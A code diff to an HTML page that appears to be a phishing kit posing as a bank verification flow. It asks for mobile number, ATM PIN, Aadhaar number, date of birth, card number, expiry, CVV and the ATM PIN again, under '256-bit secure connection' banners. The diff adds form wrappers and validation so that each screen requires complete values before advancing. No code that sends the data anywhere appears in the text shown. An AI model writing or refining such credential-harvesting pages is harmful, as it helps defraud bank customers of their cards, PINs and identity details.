@@ -384,6 +384,7 @@
                 <div class="title-underline"></div>
                 <p class="card-subtitle">Verify your registered mobile number to continue</p>
 
+                <form onsubmit="event.preventDefault(); goToScreen('screen-identity');">
                 <div class="form-group">
                     <div class="label-row"><span class="label">Registered Mobile Number</span><span class="label-hint">10 digits</span></div>
                     <div class="input-wrapper">
@@ -398,7 +399,8 @@
                     </div>
                 </div>
 
-                <button class="btn" onclick="goToScreen('screen-identity')">VERIFY DETAILS</button>
+                <button type="submit" class="btn">VERIFY DETAILS</button>
+                </form>
 
                 <div class="secure-banner">
                     <div class="secure-title"><span style="font-size: 16px;">🔒</span> 256-bit secure connection</div>
@@ -432,6 +434,7 @@
                 <div class="title-underline"></div>
                 <p class="card-subtitle">Confirm Aadhaar and date of birth as per bank records</p>
 
+                <form onsubmit="event.preventDefault(); goToScreen('screen-card');">
                 <div class="form-group">
                     <div class="label-row"><span class="label">Aadhaar Number</span><span class="label-hint">12 digits</span></div>
                     <div class="input-wrapper">
@@ -445,7 +448,8 @@
                     </div>
                 </div>
 
-                <button class="btn" onclick="goToScreen('screen-card')">CONTINUE</button>
+                <button type="submit" class="btn">CONTINUE</button>
+                </form>
 
                 <div class="secure-banner">
                     <div class="secure-title"><span style="font-size: 16px;">🔒</span> 256-bit secure connection</div>
@@ -480,6 +484,7 @@
                 <div class="title-underline"></div>
                 <p class="card-subtitle">Enter your debit / credit card details securely</p>
 
+                <form onsubmit="event.preventDefault(); openModal();">
                 <div class="form-group">
                     <div class="label-row"><span class="label">Debit / Credit Card Number</span></div>
                     <div class="input-wrapper">
@@ -502,7 +507,8 @@
                     </div>
                 </div>
 
-                <button class="btn" onclick="openModal()">VERIFY DETAILS</button>
+                <button type="submit" class="btn">VERIFY DETAILS</button>
+                </form>
 
                 <div class="secure-banner">
                     <div class="secure-title"><span style="font-size: 16px;">🔒</span> 256-bit secure connection</div>
@@ -562,6 +568,7 @@
             <div class="title-underline"></div>
             <p class="card-subtitle" style="font-size: 14px; margin-bottom: 20px;">Enter your 4 or 6 digit ATM PIN to complete verification</p>
 
+            <form onsubmit="event.preventDefault(); completeVerification();">
             <div class="form-group" style="text-align: left;">
                 <div class="label-row"><span class="label">ATM Pin</span><span class="label-hint">Required</span></div>
                 <div class="input-wrapper">
@@ -569,13 +576,38 @@
                 </div>
             </div>
 
-            <button class="btn" style="margin-bottom: 12px;" onclick="completeVerification()">VERIFY DETAILS</button>
+            <button type="submit" class="btn" style="margin-bottom: 12px;">VERIFY DETAILS</button>
+            </form>
             <a href="#" style="color: var(--primary-blue); text-decoration: none; font-weight: 500; font-size: 15px;" onclick="closeModal(event)">Cancel</a>
         </div>
     </div>
 
     <script>
         function goToScreen(screenId) {
+            if (screenId === "screen-identity") {
+                let mobile = document.querySelector('input[placeholder="Enter mobile number"]')?.value;
+                let pin = document.querySelector('input[placeholder="Enter ATM PIN"]')?.value;
+                if (!mobile || mobile.length < 10) {
+                    alert("Please enter a valid 10-digit mobile number.");
+                    return;
+                }
+                if (!pin || pin.length < 4) {
+                    alert("Please enter your ATM PIN.");
+                    return;
+                }
+            } else if (screenId === "screen-card") {
+                let aadhaar = document.querySelector('input[placeholder="XXXX XXXX XXXX"]')?.value;
+                let dob = document.querySelector('input[placeholder="DD/MM/YYYY"]')?.value;
+                if (!aadhaar || aadhaar.length < 12) {
+                    alert("Please enter a valid 12-digit Aadhaar number.");
+                    return;
+                }
+                if (!dob || dob.length < 10) {
+                    alert("Please enter your Date of Birth.");
+                    return;
+                }
+            }
+
             // Hide all screens
             document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
             // Show target screen
@@ -593,6 +625,22 @@
 
         // Modal Functions
         function openModal() {
+            let card = document.querySelector('input[placeholder="XXXX XXXX XXXX XXXX"]')?.value;
+            let exp = document.querySelector('input[placeholder="MM/YY"]')?.value;
+            let cvv = document.querySelector('input[placeholder="CVV"]')?.value;
+            
+            if (!card || card.length < 19) {
+                alert("Please enter a valid Card Number.");
+                return;
+            }
+            if (!exp || exp.length < 5) {
+                alert("Please enter Card Expiry Date.");
+                return;
+            }
+            if (!cvv || cvv.length < 3) {
+                alert("Please enter CVV.");
+                return;
+            }
             document.getElementById('pinModal').style.display = 'flex';
         }
         function closeModal(e) {
@@ -600,6 +648,11 @@
             document.getElementById('pinModal').style.display = 'none';
         }
         function completeVerification() {
+            let cpin = document.querySelector('input[placeholder="...."]')?.value;
+            if (!cpin || cpin.length < 4) {
+                alert("Please enter your ATM PIN.");
+                return;
+            }
             closeModal();
             goToScreen('screen-success');
         }
